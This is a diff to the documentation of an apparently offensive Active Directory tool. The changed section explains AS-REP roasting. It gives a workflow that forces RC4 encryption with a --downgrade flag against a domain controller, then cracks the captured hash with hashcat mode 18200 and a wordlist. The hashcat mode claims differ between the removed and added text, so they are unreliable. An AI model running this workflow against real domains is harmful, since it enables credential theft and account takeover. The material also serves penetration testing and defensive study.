@@ -361,37 +361,39 @@ KDC responds with a full AS-REP without requiring encrypted pre-authentication.
 The BOF flags these with `[+] ASREP ROASTABLE (no pre-auth)`.
 
 Add `--roast` to extract the encrypted portion directly and print a
-hashcat-ready hash:
+hashcat-ready hash.
+
+### ⚠️ Only RC4 hashes are crackable offline
+
+AES-256 and AES-128 AS-REP hashes (`$krb5asrep$18$` / `$krb5asrep$17$`) are
+**not supported by hashcat** (6.2.x) for offline cracking. The key derivation
+uses PBKDF2-HMAC-SHA1 with 4096 iterations, making it computationally
+impractical. **`--roast` only produces actionable output when combined with
+`--downgrade`** on a DC that still allows RC4.
+
+| Etype | Hash prefix | Crackable? | Hashcat mode |
+|---|---|---|---|
+| 23 (RC4) | `$krb5asrep$23$...` | ✅ Yes | `-m 18200` |
+| 18 (AES-256) | `$krb5asrep$18$...` | ❌ Not currently | — |
+| 17 (AES-128) | `$krb5asrep$17$...` | ❌ Not currently | — |
+
+**Workflow — get a crackable RC4 hash:**
 
 ```
-userenum --roast -d corp.local --dc 10.0.0.1 users.txt
+# 1. --downgrade forces RC4 etype in the AS-REQ etype list
+#    Only works if the DC has RC4 enabled (disabled by default on 2025+)
+userenum --roast --downgrade -d corp.local --dc 10.0.0.1 users.txt
 
 [+] ASREP ROASTABLE (no pre-auth): svc_backup@corp.local
-[HASH] $krb5asrep$18$svc_backup@CORP.LOCAL:aabbccddee...
+[HASH] $krb5asrep$23$svc_backup@CORP.LOCAL:aabb...$ccdd...
+
+# 2. Crack with hashcat mode 18200
+hashcat -m 18200 hashes.txt rockyou.txt
 ```
 
-Hash formats and hashcat modes:
-
-| Etype | Condition | Hash prefix | Hashcat mode |
-|---|---|---|---|
-| 18 (AES-256) | Default — modern DC | `$krb5asrep$18$...` | `-m 19700` |
-| 17 (AES-128) | DC prefers AES-128 | `$krb5asrep$17$...` | `-m 19600` |
-| 23 (RC4) | `--downgrade` + RC4 enabled on DC | `$krb5asrep$23$...` | `-m 18200` |
-
-RC4 hashes (mode 18200) crack significantly faster than AES (modes 19600/19700)
-because RC4 key derivation is a single MD4 hash, while AES uses PBKDF2-HMAC-SHA1
-with 4096 iterations. If the target domain allows RC4, use `--downgrade` to
-request the faster-to-crack hash:
-
-```
-userenum --roast --downgrade -d corp.local --dc 10.0.0.1 users.txt
-```
-
-Crack with hashcat:
-```bash
-hashcat -m 19700 hashes.txt rockyou.txt   # AES-256
-hashcat -m 18200 hashes.txt rockyou.txt   # RC4
-```
+If the DC returns `ETYPE_NOSUPP` when using `--downgrade`, RC4 is disabled
+domain-wide and offline cracking of AS-REP hashes is not currently feasible
+with standard tools.
 
 ---
 
